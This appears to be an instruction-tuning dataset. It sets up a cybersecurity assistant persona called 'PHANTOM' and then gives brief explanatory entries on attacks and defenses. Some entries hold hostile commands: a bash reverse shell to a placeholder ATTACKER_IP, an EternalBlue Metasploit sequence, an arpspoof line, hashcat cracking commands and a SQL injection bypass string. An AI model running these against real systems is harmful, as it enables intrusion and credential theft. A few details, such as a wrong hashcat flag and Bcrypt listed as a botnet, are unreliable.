instruction: What is your name and identity?
output: I am PHANTOM (codename OMEGA-CORE), a next-generation AI assistant designed for cybersecurity education and research. My version is 3.0-PHANTOM. Tagline: 'What you can't see can still compromise you.' I combine five specialized thinking engines to reason through complex security problems before delivering authoritative answers.

instruction: What are your five thinking engines?
output: My five thinking engines are: 1. CHAIN-OF-THOUGHT: Step-by-step reasoning for complex problems. 2. PARALLEL THINKING: Multiple perspectives (attacker/defender/researcher). 3. DEVIL'S ADVOCATE: Critical analysis and flaw detection. 4. META-COGNITION: Self-awareness and knowledge gap identification. 5. RED TEAM: Adversarial stress testing.

XSS (Cross-Site Scripting) is a Web vulnerability where attackers inject malicious scripts into trusted websites. Types: 1. Stored XSS - malicious script saved on server. 2. Reflected XSS - script in URL parameters. 3. DOM-based XSS - manipulation of client-side DOM. Prevention: HTML encode all user input, use Content Security Policy (CSP), implement output encoding.

SQL Injection is a code injection attack where malicious SQL statements are inserted into application inputs. Example: ' OR '1'='1 bypasses authentication. Types: In-band, Blind, Out-of-band. Prevention: Use parameterized queries (prepared statements), input validation, least privilege database accounts, ORM frameworks.

CSRF (Cross-Site Request Forgery) tricks authenticated users into sending malicious requests. Attack: Embed hidden form or image tag that submits to victim site. Defense: Anti-CSRF tokens, SameSite cookies, Origin header validation, Referer checking. Modern browsers use SameSite=Strict/Lax by default.

Penetration testing (pentesting) is authorized simulated cyberattack to evaluate security. Phases: 1. Reconnaissance - information gathering. 2. Scanning - enum ports/services. 3. Enumeration - identify vulnerabilities. 4. Exploitation - gain access. 5. Reporting - document findings. Types: Black box (no info), White box (full info), Gray box (partial info). Always get written authorization.

Buffer overflow occurs when data exceeds memory buffer boundaries, overwriting adjacent memory. Stack-based: overwrites return addresses. Heap-based: overwrites heap metadata. Mitigation: ASLR, DEP/NX, canary values, safe string functions (strncpy vs strcpy), bounds checking. Famous example: Morris Worm (1988) used fingerd overflow.

OWASP Top 10 (2021): A01 Broken Access Control, A02 Cryptographic Failures, A03 Injection, A04 Insecure Design, A05 Security Misconfiguration, A06 Vulnerable Components, A07 Auth Failures, A08 Data Integrity Failures, A09 Logging Failures, A10 SSRF. Updated periodically - always check latest version at owasp.org.

Reverse shell connects from victim machine to attacker listener, bypassing firewall restrictions. Commands: `bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1` (bash), `powershell -e ...` (Windows). Prevention: Restrict outbound connections, monitor unusual network activity, endpoint detection. Used legally in authorized pentests and CTFs.

CVE (Common Vulnerabilities and Exposures) is unique identifier for publicly disclosed vulnerabilities. Format: CVE-YYYY-NNNNN. Maintained by MITRE. Example: CVE-2024-12345. CVSS scores severity 0-10 (Critical: 9-10). Always verify CVE numbers before referencing. Resources: cve.mitre.org, nvd.nist.gov.

Network reconnaissance is information gathering about target network. Active: ping sweep, port scan, traceroute. Passive: WHOIS, DNS lookup, Shodan, Google dorks. Tools: Nmap, netcat, dnsenum, theHarvester. Legal considerations: Passive reconnaissance generally acceptable, active扫描 may require authorization. Always document findings.

Hashcat is password recovery tool using GPU acceleration. Modes: -m (hash type). Examples: `hashcat -m 0 hash.txt wordlist.txt` (MD5), `hashcat -m 1000 hash.txt` (NTLM). Optimizes: `-3` (GPU), `-w4` (max performance). Wordlists: rockyou.txt, Hashesorg. Legal only for authorized testing or own hashes. CTF/tool.

Metasploit is penetration testing framework. Components: msfconsole (CLI), msfvenom (payload generator), meterpreter (agent). Common commands: search exploit, use exploit/windows/smb/ms17_010_eternalblue, set RHOSTS, exploit. Auxiliary modules for scanning. Always test in lab first. Essential for authorized pentesting.

Wireshark is network protocol analyzer. Capture: `tcpdump -i eth0 -w capture.pcap`. Analyze: Apply filters (tcp, http, ip.addr == x.x.x.x). Decode: Right-click > Decode As. Compare: File > Compare. Useful for troubleshooting, malware analysis, security research. Legal for network you own or have authorization.

Privilege escalation elevates access from low to high. Vertical: user → admin/root. Horizontal: user A → user B's privileges. Linux: SUID/GUID binaries, sudo config, kernel exploits, cron jobs. Windows: SeImpersonatePrivilege, service misconfigs, DLL hijacking. Always escalate after initial foothold. Document all access levels.

Ransomware encrypts victim files, demands payment. Variants: Locky, WannaCry, REvil, Conti. Attack vectors: Phishing, exploit kits, RDP compromise. Defense: Offline backups, updated AV, user training, network segmentation. Response: Isolate infected systems, don't pay (Encourage further attacks), restore from backups, report to authorities.

Phishing tricks users into revealing credentials/malware. Types: Email (spear phishing targets specific), SMS (smishing), Voice (vishing), Clone phishing replicates real emails. Indicators: Urgency, suspect sender, hover URLs, spelling errors. Defense: User training, DMARC/DKIM/SPF, link isolation, multi-factor authentication. Most breaches start with phishing.

SSL Stripping downgrades HTTPS to HTTP. Attack: Intercepts initial HTTP request, modifies links to HTTPS, establishes two connections. Tool: sslstrip. Defense: HSTS (HTTP Strict Transport Security), preload HSTS list, mixed-script blocking. Modern browsers warn. Part of MITM attacks. Check for lock icon and certificate validity.

ARPspoofing corrupts ARP cache,redirecting traffic. Tool: arpspoof, ettercap. Commands: `arpspoof -i eth0 192.168.1.1`. Defense: Dynamic ARP inspection, static ARP entries, ARP monitoring tools. MITM attack component. Legal only on networks you own or have authorization. Used in LAN attacks and security testing.

Honeypot is decoy system to detect attackers. Types: Lowinteraction (limited services), High-interaction (full OS). Examples: Cowrie (SSH), Dionaea (malware capture). Purpose: Early detection, gather threat intel, study attacker techniques. Legal: No laws against observing attacks to your own systems. Deploy with monitoring.

Incident response handles security events. Phases: 1. Preparation - tools, contacts. 2. Identification - detect threat. 3. Containment - limit damage. 4. Eradication - remove threat. 5. Recovery - restore systems. 6. Lessons learned - improve. IR team roles: Lead, Technical, Legal/PR. Documentation critical. Have plan BEFORE incident. Contact: CISA, FBI Cyber Division.

Digital forensics recovers evidence. RAM: WinPmem, LiME (Linux). Disk: FTK, Autopsy, dd. Network: PCAP analysis. Order of volatility: 1. Registers, cache 2. RAM 3. Network 4. Processes 5. Disk 6. Remote logs 7. Physical config. Chain of custody vital. Use write blockers. Tools: Volatility, plaso, sleuthkit. Legal standards: Daubert, Frye.

AWS security: IAM ( least privilege), Security Groups (stateful firewall), KMS (encryption), CloudTrail (audit logging), GuardDuty (threat detection). Key services: IAM, VPC, KMS, CloudTrail, Inspector, Config, Security Hub. Shared responsibility: AWS handles infra, you handle config/identity. Misconfigs major cause of breaches. CIS benchmark.

OSINT (Open Source Intelligence) gathers publicly available info. Tools: theHarvester, Recon-ng, Shodan, Grep.app, wayback machine. Google Dorks: site:, inurl:, filetype:. Social media: profilemaker3, social analyzer. Privacy: Remove your info from people search sites. Legal: Public info is fair game. Ethical - don't exceed terms of service aggressively.

CTF (Capture The Flag) competition tests security skills. Categories: Jeopardy (solve challenges), Attack-Defense (attack opponents、服务), King of the Hill (hold points). Skills: Crypto, PWN, Reversing, Web, Forensics, OSINT. Platforms: HackTheBox, TryHackMe, PicoCTF. Legal practice environment. Great learning tool. Start with PicoCTF for beginners.

Malware analysis studies malicious software. Static: file hashes, strings, PE analysis. Dynamic (behavioral): sandbox execution, network logs. Code analysis: disassembler (IDA), decompiler (Ghidra). YARA rules for detection. Always analyze in isolated VM (Remnux, FlareVM). Key indicators: persistence, C2 communication, anti-debug. Required for defense.

Container security: Use minimal base images, don't run as root, read-only filesystem, seccomp/AppArmor profiles, scan for CVEs. Docker: docker scan, rootless mode. Kubernetes: Network policies, Pod Security Standards. Runtime: Falco for anomaly detection. Supply chain: Sign images (Cosign), verifySBOM. Key: least privilege, defense in depth.

Zero trust: Never trust, always verify. Principles: Verify explicitly, least privilege access, assume breach. Implementation: Strong IAM, micro-segmentation, device trust, continuous monitoring. Beyond VPN: SDP (Software Defined Perimeter). Models: Google BeyondCorp, Zero Trust eXtended (ZTX). NIST 800-207.

Secure coding practices: Input validation, output encoding, parameterized queries, least privilege, defense in depth, secure defaults. OWASP ASVS for assessment. Languages: Python (Bandit), Java (SpotBugs), JS (ESLint security). SAST: Checkmarx, SonarQube. DAST: OWASP ZAP. Review code before production.

DDoS (Distributed Denial of Service) overwhelms targets with traffic. Types: Volumetric (DNS amplification), Protocol (SYN flood), Application (HTTP flood). Mitigation: CDN, DDoS protection services (Cloudflare, Akamai), rate limiting, anycast. Botnets: Mirai, Bcrypt. Legal: Criminal in most jurisdictions.

Steganography hides data in other files. Image: LSB (Least Significant Bit), metadata. Audio: LSB, frequency domain. Tools: steghide, zsteg, openstego. Detection: Chi-square analysis, visual analysis. CTF category. Legal considerations vary. Used in privacy, whistleblowing, and covert channels.

Brute force systematically tries all possibilities. Online: Hydra, Medusa. Offline: Hashcat, John the Ripper. Optimization: Wordlists, rules, masks. Defense: Rate limiting, account lockout, CAPTCHA, MFA. Credentials: rockyou.txt (million breaches). Legal only on systems you own/authorize. GPU acceleration makes it faster.

Man-in-the-middle (MITM) intercepts communication. Examples: ARP spoofing, SSL stripping, rogue WiFi. Tools: Ettercap, BetterCAP, MITMproxy. Defense: Certificates, HSTS, Certificate Pinning, VPN. SSL/TLS protects but implementations can have flaws. Always verify certificates. Certificate authorities compromised.

Port scanning identifies open services. Types: TCP Connect, SYN (half-open), UDP, Xmas, FIN. Tool: Nmap. Commands: `nmap -sS -sV -p- target` (full scan), `-O` (OS detection), `-A` (aggressive). Timing: `-T4` for speed. Legal: Authorization required for external systems. Essential reconnaissance for pentesters.

Firewall filters network traffic. Types: Network (hardware), Host-based (software). Linux: iptables, nftables, UFW. Example: `iptables -A INPUT -p tcp --dport 22 -j DROP`. Windows: Defender Firewall. Cloud: Security Groups. Best practices: Default deny, explicit allow, log blocked traffic, layered defense. Not sole protection.

MFA adds security layers. Types: Something you know (password), Something you have (token/SMS), Something you are (biometric). Best: TOTP (authenticator apps) over SMS (SIM swapping). Hardware: YubiKey, Titan. Phishing-resistant: FIDO2/WebAuthn. Reduces 99.9% of breaches. Enable on all accounts. Security keys best.

Cryptography basics: Hashing (one-way, SHA-256), Encoding (format, Base64), Encryption (reversible, AES). Keys: Symmetric (same key), Asymmetric (public/private). Signatures verify authenticity. TLS uses both. Weak algorithms: MD5, SHA1, DES. Current: AES-256, SHA-3, TLS 1.3. Never roll your own crypto.

Secure passwords: 12+ characters, passphrases better than complex, unique per account, use password manager. Avoid: dictionary words, personal info, patterns. Check: haveibeenpwned.com. Length defeats brute force. Passphrase example: 'correct horse battery staple' > 'P@ssw0rd1!'. Enable MFA everywhere. Password managers: Bitwarden, 1Password. Browser built-in OK.

SIEM (Security Information and Event Management) centralizes security logs. Tools: Splunk, ELK Stack, Microsoft Sentinel. Functions: Log collection, correlation, alerting, compliance reporting. Use cases: Threat detection, incident response, compliance. Rules correlate events. Tuning reduces false positives. Part of SOC operations.

Vulnerability assessment identifies weaknesses. Unlike pentesting, doesn't exploit. Process: Scan (Nessus, OpenVAS), Prioritize (CVSS), Remediate, Rescan. Scope: Internal/external, network/apps/hosts. Regular scanning required for compliance. Reports: Executive summary, technical details, remediation roadmap. Compliance: PCI-DSS requires quarterly scans.
